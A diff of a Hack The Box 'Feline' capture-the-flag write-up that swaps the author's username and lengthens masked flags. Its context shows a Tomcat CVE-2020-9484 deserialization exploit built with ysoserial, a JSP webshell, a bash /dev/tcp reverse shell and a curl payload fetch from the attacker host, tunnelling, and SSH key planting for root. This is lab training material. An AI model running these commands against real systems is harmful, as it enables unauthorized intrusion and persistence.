@@ -9,6 +9,7 @@ avatar: assets/htb/feline.png
 source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Feline
 ---
+
 ## Enumeration
 
 ### Nmap scan
@@ -16,7 +17,7 @@ htb_url: https://app.hackthebox.com/machines/Feline
 I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/feline]
+┌──(kac0㉿kali)-[~/htb/feline]
 └─$ nmap -sCV -n -p- -v <YOUR_IP> -oA feline    
 Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-13 11:49 EST
 NSE: Loaded 153 scripts for scanning.
@@ -75,15 +76,15 @@ Nmap done: 1 IP address (1 host up) scanned in 29.91 seconds
 
 only two ports open, 22- SSH and 8080 - HTTP
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-virusbucket.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-virusbucket.png)
 
 HTTP had a website, VirusBucket for uploading and testing files for malware.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-virusbucket-fail-burp.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-virusbucket-fail-burp.png)
 
 I tried uploading a PHP webshell, but got `File Upload failed` errors.  Burp told me that it was an invalid filename.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-virusbucket-fail.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-virusbucket-fail.png)
 
 ```java
 <%@ page import="java.util.*,java.io.*"%>
@@ -123,17 +124,17 @@ if (request.getParameter("cmd") != null) {
 
 Next, I tried uploading a `cmd.jsp` simple webshell from [https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/cmd.jsp](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/cmd.jsp) 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-virusbucket-success.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-virusbucket-success.png)
 
 and got a success message
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-virusbucket-success-burp.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-virusbucket-success-burp.png)
 
 Note: renaming the PHP files uploaded fixed the invalid filename error.  After some testing I found that filenames could not have `-` or `_` in them.  
 
 Unfortunately neither of these webshells gave me code execution as I hoped.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-virusbucket-burp-pngerror.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-virusbucket-burp-pngerror.png)
 
 ```text
 <div id="error">
@@ -194,7 +195,7 @@ according to [https://tomcat.apache.org/tomcat-9.0-doc/changelog.html](https://t
 
 * [https://tomcat.apache.org/security-9.html\#Fixed\_in\_Apache\_Tomcat\_9.0.29](https://tomcat.apache.org/security-9.html#Fixed_in_Apache_Tomcat_9.0.29)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3-cve1.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-cve1.png)
 
 Found a vulnerability that had been fixed in version 9.0.35 that sounded very useful for getting remote code execution, which was given CVE number CVE-2020-9484.
 
@@ -215,7 +216,7 @@ bash -c "bash -I >& /dev/tcp/10.10.15.98/8990 0>&1"
 Downloaded the latest release of ysoserial and created my simple reverse shell script payload
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/feline]
+┌──(kac0㉿kali)-[~/htb/feline]
 └─$ java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections2 'curl http://10.10.15.98:9990/payload.sh -o /dev/shm/payload.sh' > downloadPayload.session
 Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
 ```
@@ -223,7 +224,7 @@ Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
 Then followed the instructions to use ysoserial to create my malicious session file to deserialize
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/feline]
+┌──(kac0㉿kali)-[~/htb/feline]
 └─$ java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections2 'chmod 777 /dev/shm/payload.sh' > chmodPayload.session   
 Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
 ```
@@ -231,7 +232,7 @@ Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
 The next malicious session file was used to give execute permissions to the first payload
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/feline]
+┌──(kac0㉿kali)-[~/htb/feline]
 └─$ java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections2 'bash /dev/shm/payload.sh' > executePayload.session
 Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
 ```
@@ -254,7 +255,7 @@ curl http://<YOUR_IP>:8080/upload.jsp -H 'Cookie:JSESSIONID=../../../opt/samples
 Finally I wrote a script to automate uploading all of these files to the server. Next I ran `python3 -m http.server` so that the final payload could be downloaded, started a netcat listener, and then I ran the script and hoped that everything would work!
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/feline]
+┌──(kac0㉿kali)-[~/htb/feline]
 └─$ ./exploit.sh 
 
 File uploaded successfully!
@@ -281,7 +282,7 @@ Each of the files were uploaded successfully, though they each threw a `HTTP Sta
 ## Initial Foothold
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/feline]
+┌──(kac0㉿kali)-[~/htb/feline]
 └─$ python3 -m http.server 9990
 Serving HTTP on 0.0.0.0 port 9990 (http://0.0.0.0:9990/) ...
 <YOUR_IP> - - [13/Dec/2020 15:51:44] "GET /payload.sh HTTP/1.1" 200 -
@@ -290,19 +291,19 @@ Serving HTTP on 0.0.0.0 port 9990 (http://0.0.0.0:9990/) ...
 Got a connection to my http.server, sending my payload on its way
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/feline]
+┌──(kac0㉿kali)-[~/htb/feline]
 └─$ script
 Script started, output log file is 'typescript'.
 
-┌──(zweilos㉿kali)-[~/htb/feline]
+┌──(kac0㉿kali)-[~/htb/feline]
 └─$ bash                                                                                            1 ⨯
-zweilos@kali:~/htb/feline$ nc -lvnp 8991
+kac0@kali:~/htb/feline$ nc -lvnp 8991
 listening on [any] 8991 ...
 connect to [10.10.15.98] from (UNKNOWN) [<YOUR_IP>] 43900
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 tomcat@VirusBucket:/opt/tomcat$ ^Z
 [1]+  Stopped                 nc -lvnp 8991
-zweilos@kali:~/htb/feline$ stty raw -echo
+kac0@kali:~/htb/feline$ stty raw -echo
 nc -lvnp 8991aa:~/htb/feline$ 
 
 tomcat@VirusBucket:/opt/tomcat$ export TERM=xterm-256color
@@ -373,7 +374,7 @@ There was a docker container hosted
 ```text
 tomcat@VirusBucket:/dev/shm$ cd ~
 tomcat@VirusBucket:~$ cat user.txt 
-a26d****ed37
+a26d************************ed37
 tomcat@VirusBucket:~$ ls -la
 total 24
 drwxr-xr-x 2 root   root   4096 Jun 17 05:14 .
@@ -384,7 +385,7 @@ lrwxrwxrwx 1 root   root      9 Jun 17 05:14 .bash_history -> /dev/null
 -rw-r--r-- 1 tomcat tomcat  807 Feb 25  2020 .profile
 -rw-r--r-- 1 root   root     33 Dec 13 16:52 user.txt
 tomcat@VirusBucket:~$ cat user.txt 
-a26d****ed37
+a26d************************ed37
 ```
 
 The user `tomcat` ended up being the user with the `user.txt` flag!
@@ -500,7 +501,7 @@ This module would require the port to be open from the outside, so I decided to 
 ### Getting a shell
 
 ```text
-┌──(zweilos㉿kali)-[~/chisel]
+┌──(kac0㉿kali)-[~/chisel]
 └─$ ./chisel server -p 9909 --reverse -v
 2020/12/13 17:22:16 server: Reverse tunnelling enabled
 2020/12/13 17:22:16 server: Fingerprint HYIDJ4oC82ux+xRH1u1L7oA5PXQuW84xghpdsqO69NA=
@@ -585,9 +586,9 @@ There was no `root.txt` in the /root folder, but there was a `todo.txt`
 switching the payload to cmd/unix/python//// made it much more stable
 
 ```text
-echo 'ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBALitdwPZ4cTmWVPyzqI7w1UMtDj2y4uYZBCCdc2yi+tHz8y1VkLLWWH9ohWsGQEOT1L9t/Zc8emG+VqFZL/N0w= zweilos@kali' > authorized_keys
+echo 'ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBALitdwPZ4cTmWVPyzqI7w1UMtDj2y4uYZBCCdc2yi+tHz8y1VkLLWWH9ohWsGQEOT1L9t/Zc8emG+VqFZL/N0w= kac0@kali' > authorized_keys
 cat authorized_keys
-ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBALitdwPZ4cTmWVPyzqI7w1UMtDj2y4uYZBCCdc2yi+tHz8y1VkLLWWH9ohWsGQEOT1L9t/Zc8emG+VqFZL/N0w= zweilos@kali
+ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBALitdwPZ4cTmWVPyzqI7w1UMtDj2y4uYZBCCdc2yi+tHz8y1VkLLWWH9ohWsGQEOT1L9t/Zc8emG+VqFZL/N0w= kac0@kali
 cd ..
 cd ..
 python -c 'import pty;pty.spawn("/bin/bash")'
@@ -808,7 +809,7 @@ drwx------    2 root     root          4096 Jun 30 09:10 .ssh
 drwxr-xr-x    3 root     root          4096 May 18  2020 snap
 /tmp # ^[[28;8Rcat root.txt
 cat root.txt
-cadb****9e63
+cadb************************9e63
 /tmp # ^[[28;8Recho 'ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBALitdwPZ4cTmWVPyzqI7w1UMtDj2y4uYZBCCdc2yi+tHz8y1VkLLWWH9ohWsGQEOT1L9t/Zc8emG+VqFZL/N0w=' >> .ssh/authorized_keys
 echo 'ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTY
 AAABBBALitdwPZ4cTmWVPyzqI7w1UMtDj2y4uYZBCCdc2yi+tHz8y1VkLLWWH9ohWsGQEOT1L9t/Zc8e
@@ -820,7 +821,7 @@ I changed directories to `/tmp` in the container, which now mirrored `/root` on 
 ### Root.txt
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/feline]
+┌──(kac0㉿kali)-[~/htb/feline]
 └─$ ssh root@<YOUR_IP> -i tomcat.key                  
 Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-42-generic x86_64)
 
@@ -860,5 +861,5 @@ VirusBucket
 root@VirusBucket:~# ls
 root.txt  snap
 root@VirusBucket:~# cat root.txt
-cadb****9e63
+cadb************************9e63
 ```
